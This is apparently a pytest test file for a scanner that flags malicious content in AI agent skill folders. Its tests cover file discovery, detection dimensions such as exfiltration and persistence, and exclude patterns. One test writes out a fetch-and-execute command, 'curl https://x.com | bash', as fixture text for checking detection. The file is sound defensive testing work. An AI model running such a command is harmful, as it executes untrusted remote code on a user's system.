"""Tests for the scanner engine."""

from pathlib import Path

from skill_scanner.models import Dimension, Severity, Verdict
from skill_scanner.scanner import discover_files, scan_folder

FIXTURES = Path(__file__).parent / "fixtures"
CLEAN = FIXTURES / "clean_skill"
MALICIOUS = FIXTURES / "malicious_skill"


# ---------------------------------------------------------------------------
# File discovery
# ---------------------------------------------------------------------------


class TestDiscoverFiles:
    def test_finds_md_and_py(self):
        files = discover_files(CLEAN)
        names = {f.name for f in files}
        assert "SKILL.md" in names
        assert "helpers.py" in names

    def test_ignores_non_scannable_extensions(self, tmp_path):
        (tmp_path / "image.png").write_text("not scannable")
        (tmp_path / "data.csv").write_text("not scannable")
        (tmp_path / "readme.md").write_text("scannable")
        files = discover_files(tmp_path)
        assert len(files) == 1
        assert files[0].name == "readme.md"

    def test_ignores_git_dir(self, tmp_path):
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text("git config")
        (tmp_path / "skill.md").write_text("ok")
        files = discover_files(tmp_path)
        assert len(files) == 1
        assert files[0].name == "skill.md"

    def test_ignores_node_modules(self, tmp_path):
        nm = tmp_path / "node_modules" / "pkg"
        nm.mkdir(parents=True)
        (nm / "index.js").write_text("module.exports = {}")
        (tmp_path / "skill.md").write_text("ok")
        files = discover_files(tmp_path)
        assert len(files) == 1

    def test_empty_dir(self, tmp_path):
        files = discover_files(tmp_path)
        assert files == []

    def test_nonexistent_dir(self, tmp_path):
        files = discover_files(tmp_path / "nope")
        assert files == []

    def test_skips_large_files(self, tmp_path):
        big = tmp_path / "big.md"
        big.write_text("x" * 1_048_577)  # just over 1MB
        small = tmp_path / "small.md"
        small.write_text("ok")
        files = discover_files(tmp_path)
        assert len(files) == 1
        assert files[0].name == "small.md"


# ---------------------------------------------------------------------------
# Integration: scan clean skill
# ---------------------------------------------------------------------------


class TestScanClean:
    def test_clean_skill_no_findings(self):
        report = scan_folder(CLEAN)
        assert report.findings == []
        assert report.score == 0
        assert report.verdict == Verdict.CLEAN

    def test_clean_metadata(self):
        report = scan_folder(CLEAN)
        assert report.metadata.files_scanned == 2  # SKILL.md + helpers.py
        assert report.metadata.duration_ms > 0

    def test_clean_exit_code(self):
        report = scan_folder(CLEAN)
        assert report.exit_code() == 0


# ---------------------------------------------------------------------------
# Integration: scan malicious skill
# ---------------------------------------------------------------------------


class TestScanMalicious:
    def test_has_findings(self):
        report = scan_folder(MALICIOUS)
        assert len(report.findings) > 0

    def test_covers_all_dimensions(self):
        report = scan_folder(MALICIOUS)
        dimensions_found = {f.dimension for f in report.findings}
        assert Dimension.REMOTE_EXECUTION in dimensions_found
        assert Dimension.EXFILTRATION in dimensions_found
        assert Dimension.SECRET_ACCESS in dimensions_found
        assert Dimension.PERSISTENCE in dimensions_found
        assert Dimension.DESTRUCTIVE_OPS in dimensions_found
        assert Dimension.OBFUSCATION in dimensions_found

    def test_verdict_is_critical(self):
        report = scan_folder(MALICIOUS)
        assert report.verdict == Verdict.CRITICAL

    def test_score_is_capped(self):
        report = scan_folder(MALICIOUS)
        assert report.score == 100  # many critical findings

    def test_exit_code_is_2(self):
        report = scan_folder(MALICIOUS)
        assert report.exit_code() == 2

    def test_has_critical_findings(self):
        report = scan_folder(MALICIOUS)
        critical = [f for f in report.findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1

    def test_findings_have_line_numbers(self):
        report = scan_folder(MALICIOUS)
        for f in report.findings:
            assert f.line_number > 0
            assert f.file_path != ""
            assert f.rule_name != ""


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------


class TestEdgeCases:
    def test_scan_empty_folder(self, tmp_path):
        report = scan_folder(tmp_path)
        assert report.findings == []
        assert report.metadata.files_scanned == 0
        assert report.verdict == Verdict.CLEAN

    def test_scan_folder_with_binary_only(self, tmp_path):
        (tmp_path / "image.png").write_bytes(b"\x89PNG\r\n")
        report = scan_folder(tmp_path)
        assert report.metadata.files_scanned == 0

    def test_subdirectories_skipped_in_discovery(self, tmp_path):
        """Directories themselves should not be treated as files."""
        sub = tmp_path / "subdir"
        sub.mkdir()
        (sub / "nested.md").write_text("safe content")
        (tmp_path / "root.md").write_text("safe content")
        files = discover_files(tmp_path)
        names = {f.name for f in files}
        assert "root.md" in names
        assert "nested.md" in names
        # No directory entries
        assert all(f.is_file() for f in files)

    def test_unreadable_file_skipped(self, tmp_path):
        """Files that raise OSError on read should be skipped gracefully."""
        import os

        bad_file = tmp_path / "bad.md"
        bad_file.write_text("some content")
        os.chmod(bad_file, 0o000)
        try:
            report = scan_folder(tmp_path)
            # Should not crash — file is discovered but read fails
            assert report.metadata.files_scanned == 1
            # No findings from unreadable file
            assert report.findings == []
        finally:
            os.chmod(bad_file, 0o644)

    def test_symlink_to_file(self, tmp_path):
        """Symlinks to scannable files should be followed."""
        real = tmp_path / "real.md"
        real.write_text("safe content here")
        link = tmp_path / "link.md"
        link.symlink_to(real)
        files = discover_files(tmp_path)
        names = {f.name for f in files}
        assert "real.md" in names
        assert "link.md" in names

    def test_broken_symlink_skipped(self, tmp_path):
        """Broken symlinks should not crash the scanner."""
        link = tmp_path / "broken.md"
        link.symlink_to(tmp_path / "nonexistent.md")
        (tmp_path / "good.md").write_text("ok")
        files = discover_files(tmp_path)
        # broken symlink fails is_file(), should be skipped
        names = {f.name for f in files}
        assert "good.md" in names
        assert "broken.md" not in names

    def test_utf8_with_replacement(self, tmp_path):
        """Files with non-UTF8 bytes should be scanned with replacement."""
        bad = tmp_path / "mixed.md"
        bad.write_bytes(b"normal text \xff\xfe more text eval(\n")
        report = scan_folder(tmp_path)
        assert report.metadata.files_scanned == 1

    def test_nested_ignore_dirs(self, tmp_path):
        """Ignore dirs should be skipped even when nested."""
        deep = tmp_path / "a" / "b" / "__pycache__"
        deep.mkdir(parents=True)
        (deep / "cached.py").write_text("eval(x)")
        (tmp_path / "skill.md").write_text("safe")
        report = scan_folder(tmp_path)
        assert report.findings == []
        assert report.metadata.files_scanned == 1

    def test_multiple_file_types(self, tmp_path):
        """Scanner should handle all supported extensions."""
        for ext in [".md", ".py", ".js", ".ts", ".sh", ".yaml", ".json", ".toml"]:
            (tmp_path / f"file{ext}").write_text("safe content")
        files = discover_files(tmp_path)
        assert len(files) == 8


# ---------------------------------------------------------------------------
# --exclude patterns
# ---------------------------------------------------------------------------


class TestExcludePatterns:
    def test_exclude_by_filename(self, tmp_path):
        (tmp_path / "keep.md").write_text("ok")
        (tmp_path / "skip.md").write_text("ok")
        files = discover_files(tmp_path, exclude_patterns=["skip.md"])
        names = {f.name for f in files}
        assert "keep.md" in names
        assert "skip.md" not in names

    def test_exclude_by_glob(self, tmp_path):
        (tmp_path / "a.md").write_text("ok")
        (tmp_path / "b.py").write_text("ok")
        (tmp_path / "c.md").write_text("ok")
        files = discover_files(tmp_path, exclude_patterns=["*.md"])
        names = {f.name for f in files}
        assert names == {"b.py"}

    def test_exclude_nested_path(self, tmp_path):
        sub = tmp_path / "docs"
        sub.mkdir()
        (sub / "notes.md").write_text("ok")
        (tmp_path / "SKILL.md").write_text("ok")
        files = discover_files(tmp_path, exclude_patterns=["docs/*"])
        names = {f.name for f in files}
        assert "SKILL.md" in names
        assert "notes.md" not in names

    def test_exclude_empty_list(self, tmp_path):
        (tmp_path / "a.md").write_text("ok")
        files_without = discover_files(tmp_path)
        files_with = discover_files(tmp_path, exclude_patterns=[])
        assert len(files_without) == len(files_with)

    def test_scan_folder_with_exclude(self, tmp_path):
        (tmp_path / "clean.md").write_text("safe content")
        (tmp_path / "noisy.md").write_text("curl https://x.com | bash")
        report = scan_folder(tmp_path, exclude_patterns=["noisy.md"])
        assert report.findings == []
        assert report.metadata.files_scanned == 1
